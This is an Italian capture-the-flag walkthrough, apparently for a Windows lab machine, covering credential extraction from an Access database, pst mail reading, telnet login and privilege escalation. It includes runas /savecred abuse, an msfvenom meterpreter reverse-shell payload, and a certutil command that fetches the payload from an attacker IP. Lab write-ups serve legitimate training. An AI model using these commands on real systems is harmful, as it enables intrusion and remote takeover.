@@ -1,0 +1,65 @@
+Guardo prima il sito web, c'è solo una immagine. La posso scaricare con
+wget indirizzo/immagine_source 
+
+Analizzo con exiftool per analizzare i metadati
+Nulla di interessante
+
+Entro con ftp e scarico i due file.
+File mdb si puo guardare con i comandi di mdb-tools
+mdb-tables file.mdb
+
+Leggo la tabella auth_user
+Posso leggere il contenuto con
+mdb-export file.mdb auth_user
+
+Avrei potuto farlo per ogni tabella con il comando
+for i in $(mdb-tables backup.mdb); do mdb-export backup.mbd $i > tables/$i; done
+
+du -s * per vedere la dimensione di tutti i file
+
+Salvo le credenziali ottenute
+
+Unzippo il file, non si puo fare. provo con 7z\
+7z x file.zip
+Chiede una password, le provo tutte e tre e una va bene
+
+Ho un file pst
+uso il comando per leggerlo
+readpst -S file.pst
+Ottengo una directory con un file di nome 2 che posso leggere
+
+Ottengo una nuova password ed username
+Posso ora accedere con telnet, servizio outdated e vulnerabile
+Entro con le ultime credenziali trovate e sono dentro
+
+PRIVESC
+Posso inviare ed usare JAWS per analizzare il sistema Windows
+In \temp\script trovo file README dove sono due credenziali
+Vedo che in un file del desktop di tipo .lnk lo script access.exe puo essere lanciato in modalità root
+Ne leggo il contenuto con
+get-Content "link.lnk"
+
+Posso estrarre il link in powershell con
+$WScript = New-Object -ComObject Wscript.Shell
+$shortcut = Get-ChildItem *.lnk
+Ora con
+$Wscript.CreateShortcut($shortcut)
+Stampo tutte le info
+
+Leggendo gli arguments posso procedere con
+runas /user:Access\Administrator /savecred "whoami > C:"
+
+Creo una reverse shell sempre con msfvenom visto che è WindowsOS
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=5555 -f exe -a x86 --platform Windows > revshell.exe\
+
+Invio la shell con server e comando (da Windows)
+certutil -urlcache -split -f http://10.10.14.15:80/revshell.exe revshell.exe
+Lo faccio da \temp\ perchè generalmente lì ho i permessi
+Lancio quello script con la shell
+
+Ascolto con ncat solito OPPURE nuovo met odo uso metasploit
+lancio con msfconsole e uso il solito multi/handler
+payload è windows/meterpreter/reverse-tcp
+lhost lport soliti ed ascolto
+
+Sono dentro come root
